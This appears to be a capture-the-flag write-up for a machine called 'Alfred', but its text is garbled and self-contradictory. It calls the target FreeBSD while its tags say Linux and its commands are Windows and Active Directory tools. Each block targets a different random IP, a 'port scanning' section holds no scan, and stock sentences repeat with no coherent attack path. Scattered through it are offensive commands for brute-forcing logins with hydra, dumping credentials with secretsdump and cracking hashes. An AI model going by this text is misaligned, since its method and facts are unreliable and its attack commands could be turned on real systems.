---
TitleSEO: "PwnTillDawn — Alfred (Medium FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Alfred (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Alfred. GPP Password and DCSync to achieve medium compromise on FreeBSD."
Keywords: "hackthebox, web, easy, pwntilldawn, linux, medium"
URL: "https://zurefx.github.io/writeups/htb-alfred-838.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-alfred-838/"
Date: "2025-08-07"
Tags: "HackTheBox, Web, Easy, PwnTillDawn, Linux, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-alfred-838"
Permalink: "/writeups/htb-alfred-838.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Alfred** is rated **Medium** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.78.252.57`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.123.125.49 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.60.24.8 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.80.254.111
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.90.216.85 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

### Web Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.192.8 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.84.225.113 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.71.126.87 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **ACL Abuse**.

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.82.185 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.33.163
```

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
evil-winrm -i 10.126.47.148 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.189.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.67.186.109 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.14.250.68/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `john`
- `nikto`
- `ligolo-ng`
- `atexec`
- `rpcclient`
- `burpsuite`
- `feroxbuster`
- `wmiexec`

### Key Takeaways

- GPP Password
- DCSync
- ACL Abuse
- Docker Escape
